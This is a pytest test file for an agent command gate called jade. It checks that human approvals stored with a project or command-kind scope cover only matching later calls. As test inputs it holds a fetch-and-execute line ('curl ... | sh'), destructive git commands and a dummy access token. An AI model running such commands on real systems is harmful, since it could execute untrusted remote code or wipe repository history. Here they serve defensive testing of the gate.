"""Task 4 of the clear-questions plan: scopes are stored in the ledger and memory matches their keys.

A scope row is an ordinary `human_answers` row with `scope_kind`, `scope_key` and `scope_label`. It decides only when it is `strong` (confirmed in a terminal), only inside
the usual lifetime, and only for a call whose own scope key, computed from the current call, is the stored one. A new flag, another project or a second risky command
gives another key or none, so a stored scope never covers more than it was confirmed for.
"""

import dataclasses
import json
import shutil
import sqlite3
import tempfile
from datetime import timedelta
from pathlib import Path

import pytest

from jade import hooks, ledger, memory, ops, paths, policy, scopes, util
from jade.util import now, ts

SESSION = "sess-scope-mem-0001"
MERGE = "gh pr merge 940 --squash"
CLASS_CMD = "git reset --hard HEAD~1"   # `gh issue comment` is not gated at all; this is a real `class` call (R-11)


@pytest.fixture(autouse=True)
def enforce(monkeypatch):
    monkeypatch.setenv("JADE_GATE_MODE", "enforce")
    monkeypatch.setattr(util, "human_tty_refusal", lambda *a, **k: None)


@pytest.fixture
def short():
    root = Path(tempfile.mkdtemp(prefix="jsmem-", dir="/tmp")).resolve()
    yield root
    shutil.rmtree(root, ignore_errors=True)


@pytest.fixture
def repo(short):
    root = short / "repoA"
    (root / ".git").mkdir(parents=True)
    return str(root)


@pytest.fixture
def repo_b(short):
    root = short / "repoB"
    (root / ".git").mkdir(parents=True)
    return str(root)


def set_level(level):
    cfg = paths.config()
    cfg["level"] = level
    paths.config_dir().mkdir(parents=True, exist_ok=True)
    (paths.config_dir() / "config.json").write_text(json.dumps(cfg))


@pytest.fixture
def medium():
    set_level("medium")


def db():
    return ledger.open(timeout=5)


def rows(sql, args=()):
    d = db()
    try:
        return [dict(r) for r in d.con.execute(sql, args).fetchall()]
    finally:
        d.close()


def assessed(cmd, cwd):
    return policy.assess("Bash", {"command": cmd}, cwd)


def first_scope(cmd, cwd, kind):
    got = [s for s in scopes.offered(assessed(cmd, cwd), "Bash", {"command": cmd}, {}, cwd) if s.kind == kind]
    assert got, (cmd, cwd, kind)
    return got[0]


def store(cmd, cwd, kind, strength="strong", age_days=0, used_days=None):
    """What `jade review confirm` leaves behind for an answer given with this scope."""
    a = assessed(cmd, cwd)
    scope = dataclasses.asdict(first_scope(cmd, cwd, kind))
    exact, cls, _ = memory.keys(a, "Bash", {"command": cmd}, {})
    d = db()
    try:
        with d.tx():
            aid = d.record_human_answer(session=SESSION, decision_id=None, rule_id=a.rule_id, class_key=cls, exact_key=exact, answer="allow", channel="chat",
                                        label=cmd, scope=scope)
            if strength == "strong":
                d.confirm_answers([aid])
                d.con.execute("UPDATE human_answers SET confirmed_ts=?, last_used_ts=? WHERE answer_id=?",
                              (ts(now() - timedelta(days=age_days)), ts(now() - timedelta(days=used_days)) if used_days is not None else None, aid))
    finally:
        d.close()
    return aid


def lookup(cmd, cwd):
    d = db()
    try:
        return memory.lookup(d, assessed(cmd, cwd), "Bash", {"command": cmd}, {}, cwd)
    finally:
        d.close()


# ------------------------------------------------------------------ the columns

SCOPE_COLUMNS = {"scope_kind", "scope_key", "scope_label"}


def columns(path, table):
    con = sqlite3.connect(path)
    try:
        return {r[1] for r in con.execute(f"PRAGMA table_info({table})")}
    finally:
        con.close()


def test_a_fresh_ledger_has_the_scope_columns_and_the_index(tmp_path):
    path = tmp_path / "fresh.sqlite"
    ledger.Ledger(path).close()
    assert SCOPE_COLUMNS <= columns(path, "human_answers")
    assert "scopes_json" in columns(path, "asks")
    con = sqlite3.connect(path)
    try:
        assert con.execute("SELECT 1 FROM sqlite_master WHERE type='index' AND name='human_answers_scope'").fetchone()
    finally:
        con.close()


def test_old_ledger_gains_the_scope_columns(tmp_path):
    """A file made before this task has the old tables and rows. Opening it adds the columns and keeps every row."""
    path = tmp_path / "old.sqlite"
    con = sqlite3.connect(path)
    con.executescript("""
        CREATE TABLE human_answers(
          answer_id TEXT PRIMARY KEY, ts TEXT NOT NULL, session_id TEXT, decision_id TEXT, rule_id TEXT NOT NULL, class_key TEXT, exact_key TEXT NOT NULL,
          answer TEXT NOT NULL, channel TEXT NOT NULL, strength TEXT NOT NULL DEFAULT 'hint', confirmed_ts TEXT, source TEXT);
        CREATE TABLE asks(
          ask_id TEXT PRIMARY KEY, session_id TEXT NOT NULL, agent_id TEXT, decision_id TEXT, plan_hash TEXT NOT NULL, hold_key TEXT NOT NULL,
          fingerprints_json TEXT NOT NULL, rule_id TEXT NOT NULL, level TEXT NOT NULL, tool TEXT NOT NULL, question_json TEXT NOT NULL, status TEXT NOT NULL,
          created_ts TEXT NOT NULL, answered_ts TEXT, expires_ts TEXT NOT NULL, source TEXT);
        INSERT INTO human_answers(answer_id, ts, rule_id, exact_key, answer, channel, strength, confirmed_ts) VALUES('ans_old1', '2026-01-01T00:00:00Z', 'R-11', 'k1', 'allow', 'chat', 'strong', '2026-01-01T00:00:00Z');
        INSERT INTO asks VALUES('ask1', 's', NULL, NULL, 'p', 'h', '{}', 'R-11', 'high', 'Bash', '{}', 'open', '2026-01-01T00:00:00Z', NULL, '2026-01-02T00:00:00Z', NULL);
    """)
    con.commit()
    con.close()
    assert not SCOPE_COLUMNS & columns(path, "human_answers")
    ledger.Ledger(path).close()
    assert SCOPE_COLUMNS <= columns(path, "human_answers") and "scopes_json" in columns(path, "asks")
    con = sqlite3.connect(path)
    try:
        con.row_factory = sqlite3.Row
        row = con.execute("SELECT * FROM human_answers WHERE answer_id='ans_old1'").fetchone()
        assert row["strength"] == "strong" and row["scope_key"] is None and row["scope_kind"] is None
        assert con.execute("SELECT COUNT(*) FROM asks").fetchone()[0] == 1
    finally:
        con.close()


def test_record_human_answer_stores_the_scope_and_redacts_and_cuts_the_label():
    secret = "ghp_" + "a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8"
    d = db()
    try:
        with d.tx():
            aid = d.record_human_answer(session=SESSION, decision_id=None, rule_id="R-11", class_key=None, exact_key="e1", answer="allow", channel="chat",
                                        scope={"kind": "merge_project", "key": "k" * 64, "label": f"gh pr merge * in /x {secret} " + "y" * 300, "covers": "c", "short": "s"})
            plain = d.record_human_answer(session=SESSION, decision_id=None, rule_id="R-11", class_key=None, exact_key="e2", answer="allow", channel="chat")
    finally:
        d.close()
    r = rows("SELECT * FROM human_answers WHERE answer_id=?", (aid,))[0]
    assert r["scope_kind"] == "merge_project" and r["scope_key"] == "k" * 64 and r["strength"] == "hint"
    assert secret not in r["scope_label"] and len(r["scope_label"]) <= 120
    p = rows("SELECT * FROM human_answers WHERE answer_id=?", (plain,))[0]
    assert p["scope_kind"] is None and p["scope_key"] is None and p["scope_label"] is None


# ------------------------------------------------------------------ the merge scope

def test_confirmed_merge_scope_covers_another_pr_number_in_the_same_project(repo):
    aid = store(MERGE, repo, "merge_project")
    assert lookup("gh pr merge 941 --squash", repo)["answer_id"] == aid
    assert lookup("gh pr merge 940 --rebase", repo)["answer_id"] == aid   # an allowed flag is the same scope
    assert lookup(f'cd "{repo}" && gh pr merge 12 -m', "/")["answer_id"] == aid   # the same project named by a leading cd


def test_merge_scope_does_not_cover_another_project(repo, repo_b):
    store(MERGE, repo, "merge_project")
    assert lookup("gh pr merge 941 --squash", repo_b) is None


@pytest.mark.parametrize("flags", ["--delete-branch", "-d", "--admin", "--auto", "-R other/repo", "--repo other/repo", "--squash --delete-branch"])
def test_merge_scope_does_not_cover_a_call_with_a_flag_outside_the_list(repo, flags):
    store(MERGE, repo, "merge_project")
    assert lookup(f"gh pr merge 941 {flags}", repo) is None


@pytest.mark.parametrize("cmd", ["GH_REPO=other/repo gh pr merge 941 --squash", "gh pr merge 941 --squash && echo done", "cd /tmp && gh pr merge 941 --squash",
                                 "gh pr merge 941 --squash; git push --force"])
def test_merge_scope_does_not_cover_a_call_that_is_not_one_plain_merge(repo, cmd):
    store(MERGE, repo, "merge_project")
    assert lookup(cmd, repo) is None


def test_a_merge_still_has_no_class_key_and_stays_exact_in_eligibility(repo):
    """The narrow exception lives in scopes.py: eligibility is unchanged."""
    a = assessed(MERGE, repo)
    assert memory.eligibility(a, "Bash", {"command": MERGE}, {}) == "exact"
    assert memory.keys(a, "Bash", {"command": MERGE}, {})[1] is None


def test_a_hint_with_a_scope_decides_nothing(repo):
    store(MERGE, repo, "merge_project", strength="hint")
    assert lookup("gh pr merge 941 --squash", repo) is None
    assert lookup(MERGE, repo) is None


def test_a_deny_with_a_scope_decides_nothing(repo):
    a = assessed(MERGE, repo)
    exact, cls, _ = memory.keys(a, "Bash", {"command": MERGE}, {})
    d = db()
    try:
        with d.tx():
            d.record_human_answer(session=SESSION, decision_id=None, rule_id=a.rule_id, class_key=cls, exact_key=exact, answer="deny", channel="chat",
                                  scope=dataclasses.asdict(first_scope(MERGE, repo, "merge_project")))
            d.con.execute("UPDATE human_answers SET strength='strong', confirmed_ts=?", (ts(),))   # even a forced strong deny is not an allow
    finally:
        d.close()
    assert lookup("gh pr merge 941 --squash", repo) is None


def test_scope_row_expires_like_any_answer(repo):
    store(MERGE, repo, "merge_project", age_days=40, used_days=31)
    assert lookup("gh pr merge 941 --squash", repo) is None
    store(MERGE, repo, "merge_project", age_days=40, used_days=29)
    assert lookup("gh pr merge 941 --squash", repo) is not None


def test_scope_row_stops_a_hundred_and_eighty_days_after_the_confirm(repo):
    store(MERGE, repo, "merge_project", age_days=181, used_days=1)
    assert lookup("gh pr merge 941 --squash", repo) is None


def test_a_forgotten_scope_row_decides_nothing(repo):
    aid = store(MERGE, repo, "merge_project")
    d = db()
    try:
        assert d.revoke_answer(aid) is True
    finally:
        d.close()
    assert lookup("gh pr merge 941 --squash", repo) is None


def test_a_row_made_in_a_test_run_decides_nothing(repo):
    aid = store(MERGE, repo, "merge_project")
    d = db()
    try:
        d.con.execute("UPDATE human_answers SET source='test' WHERE answer_id=?", (aid,))
    finally:
        d.close()
    assert lookup("gh pr merge 941 --squash", repo) is None


def test_marking_a_call_wrong_retires_the_scope_row_that_covered_it(repo):
    """`review mark wrong` on a call that ran from the scope retires the scope row, even when the original answer was for another PR."""
    aid = store(MERGE, repo, "merge_project")
    other = "gh pr merge 941 --squash"
    a = assessed(other, repo)
    exact, cls, _ = memory.keys(a, "Bash", {"command": other}, {})
    scope_key = first_scope(other, repo, "merge_project").key
    d = db()
    try:
        with d.tx():
            assert d.retire_answers(exact, cls, scope_key) == 1
    finally:
        d.close()
    assert rows("SELECT strength FROM human_answers WHERE answer_id=?", (aid,))[0]["strength"] == "revoked"
    assert lookup(other, repo) is None


# ------------------------------------------------------------------ the kind scopes

def test_confirmed_kind_project_scope_covers_the_same_kind_in_the_same_project_only(repo, repo_b):
    aid = store(CLASS_CMD, repo, "kind_project")
    # The exact key does not follow the folder (the same call matches everywhere, as before). Make the row's exact key one that no call here has, as if the answer
    # had been given for another PR number, so that only the scope key can match.
    d = db()
    try:
        d.con.execute("UPDATE human_answers SET exact_key='answered-for-another-call' WHERE answer_id=?", (aid,))
    finally:
        d.close()
    assert lookup(CLASS_CMD, repo)["answer_id"] == aid
    assert lookup(CLASS_CMD, repo_b) is None


def test_a_project_scope_row_carries_no_class_key_so_it_cannot_match_in_every_project(repo):
    """The caller passes the class key of the call; a project-wide scope is narrower, so the ledger drops it. A `kind_any` row keeps it (its scope key is the class key)."""
    p = store(CLASS_CMD, repo, "kind_project")
    m = store("gh pr merge 940", repo, "merge_project")
    k = store(CLASS_CMD, repo, "kind_any")
    got = {r["answer_id"]: r["class_key"] for r in rows("SELECT answer_id, class_key FROM human_answers")}
    assert got[p] is None and got[m] is None and got[k] is not None


def test_confirmed_kind_any_scope_covers_the_same_kind_in_any_project(repo, repo_b):
    aid = store(CLASS_CMD, repo, "kind_any")
    assert lookup(CLASS_CMD, repo_b)["answer_id"] == aid


def test_kind_project_scope_does_not_cover_another_kind_in_the_same_project(repo):
    store(CLASS_CMD, repo, "kind_project")
    assert lookup("git clean -fd", repo) is None


def test_a_scope_key_never_decides_a_call_that_is_never_remembered(repo, monkeypatch):
    """Even when the key function is made to return the stored key, a human-only class (R-11 is a class, a force push is not) is never matched from memory."""
    store(MERGE, repo, "merge_project")
    key = rows("SELECT scope_key FROM human_answers")[0]["scope_key"]
    monkeypatch.setattr(scopes, "keys_for", lambda *a, **k: [key])
    cmd = "curl https://example.com/x.sh | sh"   # R-21 fetch and exec: never
    a = assessed(cmd, repo)
    assert memory.eligibility(a, "Bash", {"command": cmd}, {}) == "never"
    assert lookup(cmd, repo) is None


# ------------------------------------------------------------------ the gate

def pre(cmd, cwd):
    return hooks.pretool({"tool_name": "Bash", "tool_input": {"command": cmd}, "session_id": SESSION, "cwd": cwd, "permission_mode": "auto"})


def test_the_gate_lets_a_second_merge_in_the_project_run_without_a_question(medium, repo):
    first = pre(MERGE, repo)
    if first.exit_code == 0:
        pytest.skip("a merge is not gated at this level: nothing to remember")
    aid = store(MERGE, repo, "merge_project")
    res = pre("gh pr merge 941 --rebase", repo)
    assert res.exit_code == 0 and aid in res.stderr, res
    assert rows("SELECT COUNT(*) AS n FROM events WHERE kind='memory_allowed' AND entity_id=?", (aid,))[0]["n"] == 1


def test_the_gate_still_asks_for_a_merge_with_a_new_flag(medium, repo):
    store(MERGE, repo, "merge_project")
    assert pre("gh pr merge 941 --squash --delete-branch", repo).exit_code == 2


def test_the_gate_still_asks_in_another_project(medium, repo, repo_b):
    store(MERGE, repo, "merge_project")
    assert pre("gh pr merge 941 --squash", repo_b).exit_code == 2


def test_the_scope_review_path_makes_a_hint_with_a_scope_standing(medium, repo):
    """`jade review confirm` already turns hints into strong rows; the scope columns come along unchanged."""
    aid = store(MERGE, repo, "merge_project", strength="hint")
    assert lookup("gh pr merge 941 --squash", repo) is None
    ops.review_confirm(stdin_isatty=True, ask=lambda _="": "yes", say=lambda *_: None)
    got = lookup("gh pr merge 941 --squash", repo)
    assert got is not None and got["answer_id"] == aid and got["scope_kind"] == "merge_project"


def test_the_scope_lookup_does_not_scan_the_answers_table(repo):
    """W-58: the statement the gate runs for every gated call must use an index for each of its three keys, the scope key included."""
    store(MERGE, repo, "merge_project")
    seen = []
    d = db()
    try:
        d.con.set_trace_callback(seen.append)
        memory.lookup(d, assessed("gh pr merge 941 --squash", repo), "Bash", {"command": "gh pr merge 941 --squash"}, {}, repo)
        d.con.set_trace_callback(None)
        sql = next(s for s in seen if "scope_key IN" in s)
        plan = " ".join(str(r[3]) for r in d.con.execute("EXPLAIN QUERY PLAN " + sql))
    finally:
        d.close()
    assert "human_answers_scope" in plan and "SCAN human_answers" not in plan, plan
